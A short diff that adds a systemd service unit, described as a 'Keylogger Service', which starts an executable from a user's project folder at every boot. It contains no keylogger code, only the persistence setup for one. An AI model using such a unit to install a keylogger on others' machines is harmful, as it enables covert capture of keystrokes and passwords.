@@ -1,0 +1,9 @@
+[Unit]
+Description=Keylogger Service
+
+[Service]
+ExecStart=/home/utkarsh/Documents/Project/key
+
+[Install]
+WantedBy=multi-user.target
+
